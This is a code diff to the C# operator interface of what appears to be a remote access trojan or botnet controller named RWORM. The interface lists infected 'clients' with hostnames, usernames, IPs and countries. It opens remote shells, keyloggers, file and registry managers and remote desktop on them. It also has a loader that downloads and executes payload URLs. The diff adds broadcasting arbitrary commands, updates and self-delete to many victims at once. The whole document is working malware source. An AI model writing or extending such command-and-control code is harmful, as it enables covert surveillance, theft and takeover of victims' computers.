@@ -112,6 +112,14 @@ namespace RWORM.GUI.ViewModels
 
         // Multi-select commands
         public ICommand SendToAllCommand           { get; }
+        public ICommand SendQuickCommand           { get; }
+
+        private string _quickCommandText = "";
+        public string QuickCommandText
+        {
+            get => _quickCommandText;
+            set { _quickCommandText = value; OnPropertyChanged(); }
+        }
 
         // Tasks
         public ICommand AddLocalFileTaskCommand    { get; }
@@ -137,7 +145,7 @@ namespace RWORM.GUI.ViewModels
             StopListenerCommand   = new RelayCommand(_ => StopListener(),  _ => ListenerRunning);
             BuildCommand          = new RelayCommand(_ => BuildClient());
 
-            bool HasClient(object? p) => IsConnected && p is ClientModel;
+            bool HasClient(object? p) => IsConnected;
             OpenShellCommand          = new RelayCommand(p => OpenShell(p as ClientModel),          HasClient);
             OpenFileManagerCommand    = new RelayCommand(p => OpenFileManager(p as ClientModel),    HasClient);
             OpenKeyloggerCommand      = new RelayCommand(p => OpenKeylogger(p as ClientModel),      HasClient);
@@ -149,7 +157,8 @@ namespace RWORM.GUI.ViewModels
             ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel),        HasClient);
             ClientUninstallCommand    = new RelayCommand(p => ConfirmUninstall(p as ClientModel),    HasClient);
             ClientUpdateCommand       = new RelayCommand(p => PromptUpdate(p as ClientModel),        HasClient);
-            SendToAllCommand          = new RelayCommand(_ => PromptMultiSend(), _ => IsConnected && Clients.Count > 0);
+            SendToAllCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync(), _ => IsConnected);
+            SendQuickCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync(), _ => IsConnected);
 
             // Tasks
             AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
@@ -200,11 +209,57 @@ namespace RWORM.GUI.ViewModels
 
         private async Task RefreshClientsAsync()
         {
-            var clients = await _server.GetClientsAsync();
+            var newClients = await _server.GetClientsAsync();
             void Apply()
             {
-                Clients.Clear();
-                foreach (var c in clients) Clients.Add(c);
+                var selectedGuids = new HashSet<string>(SelectedClients.Select(c => c.Guid), StringComparer.OrdinalIgnoreCase);
+                if (SelectedClient != null) selectedGuids.Add(SelectedClient.Guid);
+
+                var newDict = newClients.ToDictionary(c => c.Guid, StringComparer.OrdinalIgnoreCase);
+
+                // Remove disconnected clients
+                for (int i = Clients.Count - 1; i >= 0; i--)
+                {
+                    if (!newDict.ContainsKey(Clients[i].Guid))
+                        Clients.RemoveAt(i);
+                }
+
+                // Update existing or add new
+                foreach (var nc in newClients)
+                {
+                    var existing = Clients.FirstOrDefault(c => string.Equals(c.Guid, nc.Guid, StringComparison.OrdinalIgnoreCase));
+                    if (existing != null)
+                    {
+                        existing.Hostname    = nc.Hostname;
+                        existing.Username    = nc.Username;
+                        existing.OSVersion   = nc.OSVersion;
+                        existing.IpAddress   = nc.IpAddress;
+                        existing.CountryCode = nc.CountryCode;
+                        existing.Flag        = nc.Flag;
+                        existing.IsOnline    = nc.IsOnline;
+                        existing.LastSeen    = nc.LastSeen;
+                    }
+                    else
+                    {
+                        Clients.Add(nc);
+                    }
+                }
+
+                // Restore selection
+                if (selectedGuids.Count > 0)
+                {
+                    foreach (var c in Clients)
+                    {
+                        if (selectedGuids.Contains(c.Guid))
+                        {
+                            if (!SelectedClients.Contains(c))
+                                SelectedClients.Add(c);
+                            if (SelectedClient == null)
+                                SelectedClient = c;
+                        }
+                    }
+                }
+
                 OnPropertyChanged(nameof(ClientCount));
 
                 // Auto-run tasks on newly connected clients
@@ -220,52 +275,108 @@ namespace RWORM.GUI.ViewModels
                 }
             }
             var dispatcher = System.Windows.Application.Current?.Dispatcher;
-            if (dispatcher == null) Apply();          // no WPF app running
+            if (dispatcher == null) Apply();
             else if (dispatcher.CheckAccess()) Apply();
             else dispatcher.Invoke(Apply);
+        }
+
+        // ── Target Resolution & Quick Command ──────────────────────────────────
+        private readonly List<ClientModel> _contextMenuSnapshot = new();
+        public void SnapshotContextMenu()
+        {
+            _contextMenuSnapshot.Clear();
+            if (SelectedClients.Count > 0)
+                _contextMenuSnapshot.AddRange(SelectedClients);
+            else if (SelectedClient != null)
+                _contextMenuSnapshot.Add(SelectedClient);
+        }
+
+        private List<ClientModel> ResolveTargets(ClientModel? c)
+        {
+            if (c != null) return new List<ClientModel> { c };
+            if (_contextMenuSnapshot.Count > 0) return _contextMenuSnapshot.ToList();
+            if (SelectedClients.Count > 0) return SelectedClients.ToList();
+            if (SelectedClient != null) return new List<ClientModel> { SelectedClient };
+            if (Clients.Count > 0) return new List<ClientModel> { Clients[0] };
+            return new List<ClientModel>();
+        }
+
+        private async Task ExecuteQuickCommandAsync()
+        {
+            var targets = ResolveTargets(null);
+            if (targets.Count == 0 && Clients.Count > 0) targets = Clients.ToList();
+            if (targets.Count == 0)
+            {
+                System.Windows.MessageBox.Show("No clients connected or selected.", "Info",
+                    System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
+                return;
+            }
+
+            string cmd = QuickCommandText.Trim();
+            if (string.IsNullOrEmpty(cmd))
+            {
+                cmd = InputDialog.Show($"Command to send to {targets.Count} client(s):", "Send Command", "") ?? "";
+            }
+
+            if (string.IsNullOrWhiteSpace(cmd)) return;
+
+            int count = 0;
+            foreach (var c in targets)
+            {
+                _ = _server.SendCommandAsync(c.Guid, cmd);
+                count++;
+            }
+            QuickCommandText = "";
+            StatusMessage = $"Command sent to {count} client(s)";
         }
 
         // ── Shell windows ─────────────────────────────────────────────────────
         private void OpenShell(ClientModel? c)
         {
-            if (c == null) return;
-            new ShellWindow(_server, c.Guid, c.Hostname, c.IpAddress).Show();
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new ShellWindow(_server, target.Guid, target.Hostname, target.IpAddress).Show();
         }
 
         private void OpenFileManager(ClientModel? c)
         {
-            if (c == null) return;
-            new FileManagerWindow(_server, c.Guid, c.Hostname).Show();
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new FileManagerWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         private void OpenKeylogger(ClientModel? c)
         {
-            if (c == null) return;
-            new KeyloggerWindow(_server, c.Guid, c.Hostname).Show();
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new KeyloggerWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         private void OpenProcManager(ClientModel? c)
         {
-            if (c == null) return;
-            new ProcessManagerWindow(_server, c.Guid, c.Hostname).Show();
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new ProcessManagerWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         private void OpenRegistryEditor(ClientModel? c)
         {
-            if (c == null) return;
-            new RegistryEditorWindow(_server, c.Guid, c.Hostname).Show();
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new RegistryEditorWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         private void OpenRemoteDesktop(ClientModel? c)
         {
-            if (c == null) return;
-            new RemoteDesktopWindow(_server, c.Guid, c.Hostname).Show();
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new RemoteDesktopWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         // ── Client control ────────────────────────────────────────────────────
         private void PromptLoaderExec(ClientModel? c)
         {
-            var targets = SelectedClients.Count > 0 ? SelectedClients.ToList() : (c != null ? new List<ClientModel> { c } : new List<ClientModel>());
+            var targets = ResolveTargets(c);
             if (targets.Count == 0) return;
             var url = InputDialog.Show("Payload URL to download and execute:", "Loader (URL)", "https://");
             if (string.IsNullOrWhiteSpace(url)) return;
@@ -278,7 +389,7 @@ namespace RWORM.GUI.ViewModels
 
         private void PromptLoaderExecFile(ClientModel? c)
         {
-            var targets = SelectedClients.Count > 0 ? SelectedClients.ToList() : (c != null ? new List<ClientModel> { c } : new List<ClientModel>());
+            var targets = ResolveTargets(c);
             if (targets.Count == 0) return;
 
             var dlg = new Microsoft.Win32.OpenFileDialog
@@ -306,45 +417,50 @@ namespace RWORM.GUI.ViewModels
 
         private void ConfirmClose(ClientModel? c)
         {
-            if (c == null) return;
-            if (System.Windows.MessageBox.Show(
-                    $"Close client on {c.Hostname}?", "Confirm",
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
+            string msg = targets.Count == 1 ? $"Close client on {targets[0].Hostname}?" : $"Close {targets.Count} selected clients?";
+            if (System.Windows.MessageBox.Show(msg, "Confirm",
                     System.Windows.MessageBoxButton.YesNo,
                     System.Windows.MessageBoxImage.Question) != System.Windows.MessageBoxResult.Yes) return;
-            _ = _server.ClientClose(c.Guid);
+            foreach (var target in targets)
+            {
+                _ = _server.ClientClose(target.Guid);
+            }
         }
 
         private void ConfirmUninstall(ClientModel? c)
         {
-            if (c == null) return;
-            if (System.Windows.MessageBox.Show(
-                    $"Uninstall and self-delete on {c.Hostname}?\nThis is irreversible.",
-                    "Uninstall", System.Windows.MessageBoxButton.YesNo,
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
+            string msg = targets.Count == 1
+                ? $"Uninstall and self-delete on {targets[0].Hostname}?\nThis is irreversible."
+                : $"Uninstall and self-delete on {targets.Count} selected clients?\nThis is irreversible.";
+            if (System.Windows.MessageBox.Show(msg, "Uninstall",
+                    System.Windows.MessageBoxButton.YesNo,
                     System.Windows.MessageBoxImage.Warning) != System.Windows.MessageBoxResult.Yes) return;
-            _ = _server.ClientUninstall(c.Guid);
+            foreach (var target in targets)
+            {
+                _ = _server.ClientUninstall(target.Guid);
+            }
         }
 
         private void PromptUpdate(ClientModel? c)
         {
-            if (c == null) return;
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
             var url = InputDialog.Show("New binary URL for update:", "Update Client", "https://");
             if (string.IsNullOrWhiteSpace(url)) return;
-            _ = _server.ClientUpdate(c.Guid, url);
-            StatusMessage = $"Update sent → {c.Hostname}";
+            foreach (var target in targets)
+            {
+                _ = _server.ClientUpdate(target.Guid, url);
+            }
+            StatusMessage = $"Update sent to {targets.Count} client(s)";
         }
 
-        // ── Multi-select ──────────────────────────────────────────────────────
         private void PromptMultiSend()
         {
-            var cmd = InputDialog.Show("Command to send to all selected clients:", "Multi-Select Send", "");
-            if (string.IsNullOrWhiteSpace(cmd)) return;
-            int count = 0;
-            foreach (var c in SelectedClients)
-            {
-                _ = _server.SendCommandAsync(c.Guid, cmd);
-                count++;
-            }
-            StatusMessage = $"Sent to {count} clients";
+            _ = ExecuteQuickCommandAsync();
         }
 
         // ── Tasks ─────────────────────────────────────────────────────────────
